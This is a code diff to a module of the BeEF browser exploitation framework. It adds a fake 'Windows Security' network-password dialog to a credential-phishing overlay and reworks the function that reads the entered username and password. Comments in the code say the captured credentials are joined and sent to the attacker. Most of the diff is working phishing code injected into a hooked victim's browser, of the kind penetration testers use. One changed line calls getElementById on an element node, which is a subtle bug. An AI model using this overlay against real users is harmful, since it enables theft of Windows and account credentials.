@@ -77,9 +77,9 @@ beef.execute(function() {
 
 	// Check whether the user has entered a user/pass and pressed ok
 	function checker(){
-		uname1 = document.body.lastChild.getElementsByTagName("input")[0].value;
-		pass1 = document.body.lastChild.getElementsByTagName("input")[1].value;
-		valcheck = document.body.lastChild.getElementsByTagName("input")[3].value;
+		uname1 = document.getElementById("uname").value;
+		pass1 = document.getElementById("pass").value;
+		valcheck = document.getElementById("buttonpress").value;
 		
 		if (uname1.length > 0 && pass1.length > 0 && valcheck == "true") {
 			// Join user/pass and send to attacker
@@ -94,9 +94,9 @@ beef.execute(function() {
 			$j('#darkenScreenObject').remove();
 
 		}else if((uname1.length == 0 || pass1.length == 0) && valcheck == "true"){
-		// If user has not entered any data reset button
-		document.body.lastChild.getElementsByTagName("input")[3].value = "false";
-		alert("Please enter a valid username and password.");		
+			// If user has not entered any data, reset button
+			document.body.lastChild.getElementById("buttonpress").value = "false";
+			alert("Please enter a valid username and password.");		
 		}
 	}
 
@@ -158,6 +158,51 @@ beef.execute(function() {
 
 		// Build page including styles
 		sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' +windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>Email: </div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div id="box_pre" ' +box_prestyle+ '>Password: </div></td><td align="left"><input type="password" id="pass" name="pass" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div>';
+
+		// Repeatedly check if button has been pressed
+		credgrabber = setInterval(checker,1000);
+	}
+
+	// Windows floating div
+	function windows() {
+		sneakydiv = document.createElement('div');
+                sneakydiv.setAttribute('id', 'popup');
+                sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:40%; z-index:51; background-color:#ffffff;border-radius:6px;');
+                document.body.appendChild(sneakydiv);
+
+                // Set appearance using styles, maybe cleaner way to do this with CSS block?
+
+		// Set window border
+		var edgeborder = 'style="border:1px #000000 solid;border-radius:6px;"';
+		var windowborder  = 'style="width:400px;border: 7px #CFE7FE solid;border-radius:6px;"';
+
+		var windowmain    = 'style="border:1px #000000 solid;"';
+
+		var titlebarstyle = 'style="background:#CFE7FE;height:19px;font-size:12px;font-family:Segoe UI;"';
+		var titlebartext = 'Windows Security';
+
+		var promptstyle = 'style="height:40px;"';
+		var titlestyle = 'style="align:left;font-size:14px;font-family:Segoe UI;margin:10px 15px;line-height:100%;color:0042CE;"';
+		var title = 'Enter Network Password';
+		var bodystyle = 'style="align:left;font-size:11px;font-family:Segoe UI;margin:10px 15px;line-height:170%;"';
+		var body = 'Enter your password to connect to the server';
+		var dividestyle = 'style="border-bottom:1px solid #DFDFDF;height:1px;width:92%;margin-left:auto;margin-right:auto;"';
+
+		var tablestyle = 'style="background:#CFE7FE;width:90%;margin-left:auto;margin-right:auto;border:1px solid #84ACDD;border-radius:6px;height:87px"';
+		var logobox = 'style="border:4px #84ACDD solid;border-radius:7px;height:45px;width:45px;background:#ffffff"';
+		var logo = 'style="border:1px #000000 solid;height:43px;width:42px;background:#CFE7FE;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#EEF2F4, endColorstr=#CCD8DF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFE7FE));background: -moz-linear-gradient(top,  #EEF2F4,  #CCD8DF);"';
+
+		var inputboxstyle = 'style="width:140px;font-size:11px;height: 20px;line-height:20px;padding-left:4px;border-style: solid;border-width: 1px;border-color:#666666;color:#000000;border-radius:3px;"';
+
+		var credstextstyle = 'style="font-size:11px;font-family:Segoe UI;"';
+
+		var buttonstyle   = 'style="font-size: 13px;background:#069;color:#000000;border: 1px #29447e solid;padding: 3px 3px 3px 3px;margin-right:5px;border-radius:5px;width:70px;filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#ffffff, endColorstr=#CFCFCF);background: -webkit-gradient(linear, left top, left bottom, from(#ffffff), to(#CFCFCF));background: -moz-linear-gradient(top,  #ffffff,  #CFCFCF);"';
+		var buttonLabel  = '<input type="button" name="ok" value="OK" id="ok" ' +buttonstyle+ ' onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';
+
+		var bbarstyle     = 'style="background-color:#F0F0F0;padding:8px;text-align:right;border-top: 1px solid #DFDFDF;height:28px;margin-top:10px;"';
+
+		// Build page including styles
+		sneakydiv.innerHTML= '<div id="edge" '+edgeborder+'><div id="window_container" '+windowborder+ '><div id="title_bar" ' +titlebarstyle+ '>' +titlebartext+ '</div><div id="windowmain" ' +windowmain+ '><div id="prompt" '+promptstyle+'><p><span ' +titlestyle+ '>' +title+ '</span><br/><span ' +bodystyle+ '>' + body + '</span></div><div id="divide" ' +dividestyle+ '></div></p><table ' +tablestyle+ '><tr><td rowspan="3" width=75px align="center"><div id="logobox" ' +logobox+ '><div id="logo" ' +logo+ '></div></div></td><td align="left"><input type="text" id="uname" placeholder="User name" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="left"><input type="password" id="pass" name="pass" placeholder="Password" onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td><input type="checkbox"><span ' +credstextstyle+ '>Remember my credentials</span></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" id="buttonpress" name="buttonpress" value="false"/></div></div></div></div>';
 
 		// Repeatedly check if button has been pressed
 		credgrabber = setInterval(checker,1000);
@@ -252,6 +297,8 @@ beef.execute(function() {
 			facebook(); break;
 		case "LinkedIn":
 			linkedin(); break;
+		case "Windows":
+			windows(); break;
 		case "YouTube":
 			youtube();  break;
 		case "Yammer":
